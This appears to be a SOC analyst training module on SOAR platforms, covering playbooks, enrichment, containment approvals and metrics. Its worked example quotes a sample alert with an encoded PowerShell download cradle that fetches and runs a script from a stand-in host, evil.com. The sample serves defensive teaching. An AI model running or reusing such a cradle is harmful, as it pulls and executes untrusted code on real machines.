# Module 22: SOAR and Automation

**Priority: P1 — Important for first months on the job**

---

## 22.1 What is SOAR?

### Simple Explanation
**Security Orchestration, Automation, and Response (SOAR)** is a platform that connects security tools together, automates repetitive tasks, and standardizes incident response workflows through playbooks.

### Technical Explanation
SOAR platforms provide:
- **Orchestration**: Integration layer connecting disparate security tools (SIEM, EDR, Firewall, Threat Intel, Ticketing, Email, etc.) via APIs
- **Automation**: Execution of repetitive tasks without human intervention (enrichment, containment, ticket creation)
- **Response**: Standardized workflows (playbooks) for consistent incident handling
- **Case Management**: Built-in or integrated ticketing for tracking investigations

### Why SOAR Exists in Modern SOC
| Problem | SOAR Solution |
|---------|---------------|
| Alert fatigue (10,000+/day) | Auto-tiering, auto-enrichment, auto-close known FPs |
| Tool sprawl (20+ tools) | Single pane of glass, bi-directional API integration |
| Inconsistent analyst workflows | Standardized playbooks |
| Slow MTTR (Mean Time to Respond) | Automation = seconds vs hours |
| Knowledge loss on shift change | Documented playbooks, automated handoff |
| Skill gap (L1 vs L3) | Playbooks encode L3 knowledge for L1 execution |

---

## 22.2 SOAR Architecture

```
┌─────────────────────────────────────────────────────────────────┐
                        SOAR PLATFORM
└──────────────────────────┬──────────────────────────────────────┘
                           │
        ┌──────────────────┼──────────────────┐
        ▼                  ▼                  ▼
┌───────────────┐  ┌───────────────┐  ┌───────────────┐
│  ORCHESTRATION│  │  AUTOMATION   │  │  RESPONSE     │
│  (Integrations)│  │  (Playbooks)  │  │  (Case Mgmt)  │
└───────┬───────┘  └───────┬───────┘  └───────┬───────┘
        │                  │                  │
        ▼                  ▼                  ▼
┌───────────────┐  ┌───────────────┐  ┌───────────────┐
│ SIEM          │  │ Enrichment    │  │ Ticketing     │
│ EDR/XDR       │  │ (VT, OTX,     │  │ (Jira,        │
│ Firewall      │  │  AbuseIPDB,   │  │  ServiceNow)  │
│ Threat Intel  │  │  WHOIS, DNS)  │  │               │
│ Email Sec     │  │               │  │ Notification  │
│ Identity      │  │ Containment   │  │ (Slack, Email,│
│ Cloud         │  │ (Block IP,    │  │  PagerDuty)   │
│ Vuln Scanner  │  │  Isolate Host,│  │               │
└───────────────┘  │  Disable User)│  └───────────────┘
                   └───────────────┘
```

---

## 22.3 Key SOAR Concepts

### Playbook (Runbook/Workflow)
**Definition**: A codified, step-by-step incident response procedure executed by the SOAR platform.

**Components:**
- **Trigger**: What starts the playbook (alert, schedule, manual, API)
- **Actions**: Steps executed (enrichment, containment, notification)
- **Decision Points**: Conditional logic (if/else based on data)
- **Loops**: Repeat for each item (each IP, each host, each user)
- **Human Tasks**: Steps requiring analyst approval/input
- **Outputs**: Artifacts, tickets, notifications, status updates

### Playbook Example: Phishing Email Investigation
```
TRIGGER: Email security alert → "Suspicious attachment detected"

STEP 1: Extract IOCs
  → Parse email for: sender, recipients, subject, URLs, attachment hashes
  
STEP 2: Enrich IOCs (PARALLEL)
  → Hash → VirusTotal, Hybrid Analysis, internal sandbox
  → URLs → URLScan.io, PhishTank, internal reputation
  → Sender domain → WHOIS, DNS, PassiveTotal
  → Sender IP → AbuseIPDB, GreyNoise, Shodan

STEP 3: Decision: Any malicious verdict?
  → YES → Continue to Step 4
  → NO → Check user reports, mark "Benign - Monitor", END

STEP 4: Containment
  → Block sender domain/IP at email gateway
  → Block URLs at proxy/firewall
  → Quarantine email from all mailboxes
  → Block file hashes at EDR

STEP 5: Scope Assessment
  → Query SIEM: Who else received this email?
  → Query EDR: Who executed the attachment?
  → Query Proxy: Who clicked the URL?

STEP 6: Human Task: Analyst Review
  → Present enrichment results
  → Analyst confirms: True Positive / False Positive
  → If FP: Document reason, update allowlists, END

STEP 7: Incident Creation
  → Create ticket in ServiceNow/Jira
  → Populate: IOCs, affected users, containment actions, evidence
  → Assign to appropriate queue

STEP 8: Notification
  → Post to #soc-alerts Slack channel
  → Email stakeholders if high severity

STEP 9: Closure Tasks
  → Wait for remediation confirmation
  → Auto-close after 7 days if no activity
  → Generate metrics: MTTD, MTTR, containment time
```

---

## 22.4 Common SOAR Use Cases for L1

### 1. Alert Enrichment (Most Common)
**Before SOAR**: Analyst manually checks 5-10 tools per alert (5-15 min)
**After SOAR**: Auto-enrichment in 30 seconds

| IOC Type | Enrichment Sources |
|----------|-------------------|
| IP | AbuseIPDB, GreyNoise, Shodan, VirusTotal, OTX, WHOIS, GeoIP, ASN |
| Domain | VirusTotal, URLScan, WHOIS, PassiveTotal, DNSDB, RiskIQ |
| Hash (MD5/SHA256) | VirusTotal, Hybrid Analysis, MalwareBazaar, internal sandbox |
| URL | URLScan, PhishTank, Google Safe Browsing, internal proxy logs |
| Email | HaveIBeenPwned, Hunter.io, EmailRep |
| CVE | NVD, MITRE, vendor advisories, exploit-db |

### 2. Automated Containment
| Action | When Safe to Automate | Requires Human Approval |
|--------|----------------------|------------------------|
| Block IP at firewall | Known malicious IP (high confidence TI), DDoS source | Legitimate business IP, internal IP |
| Quarantine email | Known phishing/malware, high confidence | Uncertain verdict |
| Block hash at EDR | Known malware hash, ransomware | Unknown/suspicious file |
| Isolate host (EDR) | Active ransomware, C2 beaconing confirmed | Suspicious but unconfirmed |
| Disable user account | Confirmed compromise, impossible travel | Suspicious login only |
| Reset password | Credential theft confirmed | Password spray attempt only |

### 3. Automated Ticket Creation
- Standardized ticket format
- Pre-populated with enrichment data
- Linked to related alerts/cases
- Auto-assigned based on severity/type
- SLA timer starts automatically

### 4. False Positive Suppression
```python
# Pseudo-code for FP suppression logic
if alert.rule_id in KNOWN_FP_RULES:
    if alert.matches_known_fp_context():
        auto_close("Known False Positive", suppress_future=True)
        return

if alert.severity == "Low" and alert.count > 100 in 1hr:
    # Alert storm - likely misconfigured rule
    create_ticket("Alert Storm - Rule Tuning Needed", severity="Low")
    suppress_alert(rule_id, duration="4 hours")
```

---

## 22.5 Major SOAR Platforms

| Platform | Strengths | Typical Use Case |
|----------|-----------|------------------|
| **Palo Alto Cortex XSOAR** | Native XDR integration, large marketplace | Enterprise, Palo Alto shops |
| **Splunk SOAR (Phantom)** | Deep Splunk integration, visual playbook editor | Splunk-heavy environments |
| **Microsoft Sentinel + Logic Apps** | Native Azure/Defender integration, cost-effective | Microsoft 365/Defender shops |
| **FortiSOAR** | Fortinet fabric integration | Fortinet customers |
| **Siemplify (Google Chronicle)** | Cloud-native, case-centric | Cloud-first orgs |
| **Swimlane** | Low-code, flexible, on-prem/Cloud | Custom workflow needs |
| **Tines** | No-code, security-focused, fast deployment | Teams wanting speed |
| **Cortex XSIAM** | Unified SIEM+SOAR, ML-driven | Modern SOC transformation |

---

## 22.6 L1 Analyst Role in SOAR

### What L1 DOES with SOAR
- **Monitor playbook executions**: Watch dashboard for failed/pending actions
- **Execute human tasks**: Approve containment, make FP/TP determinations
- **Run ad-hoc playbooks**: "Enrich this IP", "Check this hash", "Scope this user"
- **Validate automation output**: Verify enrichment accuracy, check containment worked
- **Provide feedback**: Report false positives in automation logic, suggest improvements
- **Execute manual actions via SOAR**: Block IP, isolate host, reset password (audit trail)

### What L1 Does NOT Do (Usually)
- Write/modify playbooks (Detection Engineering / L2/L3)
- Manage integrations/API connections
- Design automation logic/architecture
- Administer SOAR platform

### L1 SOAR Dashboard Views
```
My Queue                          Playbook Status
┌─────────────────────────────┐   ┌─────────────────────────────┐
│ ☐ Human Task: Approve IP    │   │ ✅ Phishing Triage - Done   │
│    block 192.168.1.100      │   │ 🔄 Malware Containment -    │
│    [Approve] [Reject]       │   │     Waiting for EDR API     │
├─────────────────────────────┤   │ ❌ Vuln Scan Correlation -  │
│ ☐ Human Task: Confirm TP/FP │   │     Failed - API timeout    │
│    Alert: Suspicious PS     │   │    [Retry] [View Error]     │
│    [True Pos] [False Pos]   │   └─────────────────────────────┘
├─────────────────────────────┤
│ ☐ Run Playbook: Scope User  │   Recent Automation Actions
│    john.doe                 │   ┌─────────────────────────────┐
│    [Execute]                │   │ 10:23 Blocked IP 1.2.3.4    │
└─────────────────────────────┘   │ 10:22 Enriched hash abc123  │
                                  │ 10:21 Created ticket INC001 │
                                  │ 10:20 Isolated host WKS001  │
                                  └─────────────────────────────┘
```

---

## 22.7 When Automation is SAFE vs REQUIRES HUMAN

### ✅ SAFE to Fully Automate (High Confidence)
- Enrichment lookups (read-only, no impact)
- Known malicious IOC blocking (validated TI feeds)
- Closing alerts matching known FP patterns
- Creating tickets with standardized templates
- Notifications (Slack, email)
- Data collection for investigations (query SIEM, EDR, AD)
- Tagging/labeling alerts based on enrichment results

### ⚠️ REQUIRES HUMAN APPROVAL (Medium Confidence / Impact)
- Blocking IPs/domains with medium confidence TI
- Quarantining emails (business impact if FP)
- Isolating endpoints (user productivity impact)
- Disabling user accounts (business disruption)
- Password resets (user friction)
- Firewall rule changes (network impact)

### ❌ NEVER FULLY AUTOMATE (High Impact / Irreversible)
- Deleting data/accounts
- Modifying GPOs/AD structure
- Patching production systems
- Legal/regulatory notifications
- Public statements
- Evidence destruction
- Root cause remediation (vs containment)

---

## 22.8 Playbook Design Principles for SOC

### 1. Idempotency
> Running the playbook multiple times produces the same result
```python
# Good: Check if block exists before creating
if not firewall.rule_exists(ip="1.2.3.4"):
    firewall.create_block(ip="1.2.3.4")

# Bad: Blindly create (duplicates, errors)
firewall.create_block(ip="1.2.3.4")
```

### 2. Error Handling
```python
try:
    result = vt.lookup_hash(hash)
except VT_API_Error as e:
    log.error(f"VT lookup failed: {e}")
    # Continue with other enrichment sources
    # Don't fail entire playbook
    result = {"error": str(e), "source": "VirusTotal"}
```

### 3. Observability
- Every action logged with: timestamp, input, output, duration, status
- Failed steps clearly visible
- Metrics: success rate, avg duration, human task wait time

### 4. Rollback Capability
- Document how to reverse each containment action
- "Unblock IP", "Release quarantine", "Re-enable account" playbooks

### 5. Version Control
- Playbooks in Git
- Peer review for changes
- Test in staging before production

---

## 22.9 Metrics SOAR Should Track

| Metric | Target | Why It Matters |
|--------|--------|----------------|
| **Playbook Execution Success Rate** | >95% | Reliability |
| **Automation Coverage** | % of alerts auto-enriched | Efficiency |
| **Human Task Avg Wait Time** | <15 min | Analyst efficiency |
| **False Positive Auto-Close Rate** | >30% of low-sev | Alert reduction |
| **Containment Time (Auto)** | <2 min | MTTR |
| **Playbook Execution Time** | <5 min (enrichment) | Speed |
| **Integration Uptime** | 99.9% | Reliability |

---

## 22.10 Common L1 Mistakes with SOAR

| Mistake | Correction |
|---------|------------|
| Blindly approving human tasks | Review enrichment results first; understand impact |
| Not checking if automation actually worked | Verify: "Did the IP get blocked?" "Is host isolated?" |
| Running playbooks without understanding them | Know what each playbook does before executing |
| Ignoring failed playbook steps | Failed enrichment = incomplete picture; investigate manually |
| Not reporting automation false positives | Feedback loop improves playbooks |
| Treating SOAR as "magic" | It's only as good as its integrations and logic |
| Creating tickets without SOAR (manual) | Bypasses metrics, standardization, tracking |

---

## 22.11 Practical Exercise: SOAR Playbook Walkthrough

### Scenario: EDR Alert — "Suspicious PowerShell Execution"

**Playbook: `EDR_Suspicious_PowerShell_Investigation`**

```
INPUT: Alert JSON from EDR
{
  "alert_id": "EDR-2024-001234",
  "host": "WKS-0452",
  "user": "j.smith",
  "process": "powershell.exe",
  "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbCAuY29tAC8AcABhAHkAbABvAGEAZCAuAHAAcwAxACcAKQA=",
  "parent_process": "winword.exe",
  "timestamp": "2024-01-15T10:23:45Z",
  "severity": "High"
}

PLAYBOOK EXECUTION:

1. DECODE COMMAND LINE
   → Base64 decode → "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
   → TAG: "PowerShell Download Cradle", "Encoded Command"

2. ENRICH HOST (PARALLEL)
   → Query CMDB: WKS-0452 = Marketing laptop, Windows 11, CrowdStrike EDR
   → Query AD: j.smith = Marketing, standard user, no admin rights
   → Query EDR: Last 24h activity - no other alerts

3. ENRICH IOCs (PARALLEL)
   → Domain: evil.com → VT: Malicious (3/90), registered 2023-11-02, Russia
   → IP: 192.0.2.100 → AbuseIPDB: 85% confidence, C2 reports
   → URL: http://evil.com/payload.ps1 → URLScan: Malicious, downloads PowerShell script
   → Hash of payload (if known): Check internal sandbox

4. CHECK PREVALENCE
   → SIEM Query: Any other hosts contacting evil.com? → NO
   → SIEM Query: Any other PowerShell download cradles? → 2 other (different domains)
   → EDR Query: Any other winword.exe → powershell.exe chains? → NO

5. DECISION: HIGH CONFIDENCE MALICIOUS
   → Encoded command + download cradle + malicious infrastructure + unusual parent

6. AUTOMATED CONTAINMENT (Requires Human Approval)
   → [HUMAN TASK] "Approve isolation of WKS-0452 and block evil.com?"
   → Analyst reviews: Command line, VT results, host criticality (standard laptop)
   → Analyst clicks: [APPROVE]

7. EXECUTE CONTAINMENT
   → EDR: Isolate WKS-0452 (network quarantine, allow EDR management)
   → Firewall: Block evil.com / 192.0.2.100
   → Proxy: Block URL category "Malicious"
   → EDR: Block hash of payload.ps1 (if available)

8. SCOPE INVESTIGATION
   → SIEM: Search for evil.com in proxy/DNS logs (last 7 days)
   → EDR: Search for winword.exe spawning powershell.exe (last 7 days)
   → Email: Check if j.smith received phishing email with malicious doc

9. CREATE INCIDENT TICKET
   → Title: "Malicious PowerShell Download Cradle - WKS-0452 - j.smith"
   → Severity: High
   → MITRE: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer), T1204.002 (Malicious File)
   → Evidence: Alert JSON, decoded command, VT results, containment actions
   → Assigned: IR Team

10. NOTIFICATION
    → Slack #soc-incidents: "HIGH: PowerShell download cradle contained on WKS-0452"
    → Email: IT Support (for user coordination), IR Lead

OUTPUT: Incident ticket INC-2024-001234 created, host isolated, IOCs blocked
```

---

## 22.12 Summary: What L1 Must Know

- [ ] What SOAR is and why it exists
- [ ] Difference between orchestration, automation, response
- [ ] What a playbook is: trigger, actions, decisions, human tasks
- [ ] Common L1 use cases: enrichment, ticket creation, FP suppression
- [ ] When automation is safe vs requires human approval
- [ ] How to monitor playbook executions and handle human tasks
- [ ] Basic playbook design principles (idempotency, error handling, observability)
- [ ] Key metrics: automation coverage, containment time, success rate
- [ ] Major SOAR platforms and their ecosystems
- [ ] L1 role: execute, monitor, validate, provide feedback — NOT build